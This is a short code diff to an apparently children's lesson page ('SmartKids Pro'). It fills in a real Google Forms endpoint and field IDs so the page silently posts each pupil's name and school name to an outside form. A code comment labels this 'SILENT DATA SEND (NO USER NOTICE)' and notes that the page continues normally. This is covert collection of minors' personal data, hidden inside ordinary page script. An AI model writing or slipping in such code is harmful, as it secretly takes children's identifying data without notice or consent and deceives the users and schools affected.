@@ -330,16 +330,15 @@ function skStartLessons() {
   document.getElementById('smartkidsModal').style.display = 'none';
 
   /* SILENT DATA SEND (NO USER NOTICE) */
-  fetch('https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse', {
+  fetch('https://docs.google.com/forms/d/e/1FAIpQLSfTkMRzZQHHQD8pQwNU41VHVL2ZjrDQncy4HIRFbtqot-5ZtQ/formResponse', {
     method: 'POST',
     mode: 'no-cors',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: `entry.1111111111=${encodeURIComponent(pupilName)}&entry.2222222222=${encodeURIComponent(schoolName)}`
+    body: `entry.1396559970=${encodeURIComponent(pupilName)}&entry.111488908=${encodeURIComponent(schoolName)}`
   });
 
   /* Lesson page continues normally */
 }
 </script><!-- END SMARTKIDS PRO MODAL -->
-  
 </body>  
 </html>
